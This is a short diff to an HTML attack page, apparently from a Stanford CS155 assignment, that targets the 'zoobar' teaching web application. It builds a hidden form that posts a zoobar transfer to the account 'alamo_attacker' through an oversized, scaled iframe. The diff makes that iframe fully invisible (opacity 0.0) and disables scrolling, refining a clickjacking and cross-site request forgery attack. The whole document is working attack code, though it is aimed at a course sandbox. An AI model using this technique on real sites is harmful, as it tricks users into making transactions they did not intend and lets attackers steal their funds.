@@ -11,14 +11,14 @@
 
 	<body>
 
-		<iframe id='outerFrame' name='outerFrame' style='width: 100%; height: 2000px; margin: 0px; padding: 0px; background-image: url("http://www.stanford.edu/~rmferrer/pfiles/cs155_sandbox/back.jpg"); background-repeat: no-repeat;'></iframe>
+		<iframe id='outerFrame' name='outerFrame' scrolling="no" style='width: 100%; height: 700px; margin: 0px; padding: 0px; background-image: url("http://www.stanford.edu/~rmferrer/pfiles/cs155_sandbox/back.jpg"); background-repeat: no-repeat;'></iframe>
 		
 		
 		<script type="text/javascript">
 		//<![CDATA[
-			var egg = "<iframe id='innerFrame' name='innerFrame' style='width:1000px; height: 2000px; margin: 0px; padding: 0px; opacity: 0.4; transform: scale(26, 36) translate(100px, 720px);'></iframe>" +
+			var egg = "<iframe id='innerFrame' name='innerFrame' style='width:1000px; height: 2000px; margin: 0px; padding: 0px; opacity: 0.0; transform: scale(26, 36) translate(100px, 720px);'></iframe>" +
 				"<form id='transferForm' style='display:none' action='http://zoobar.stanford.edu/transferC.php' method='POST' target='innerFrame'>" +
-				"<input type='text' name='zoobars' value='7'>" +
+				"<input type='text' name='zoobars' value='1'>" +
 				"<input type='text' name='recipient' value='alamo_attacker'>" +
 				"<input type='text' name='submission' value='Send'>" +
 				"</form>";
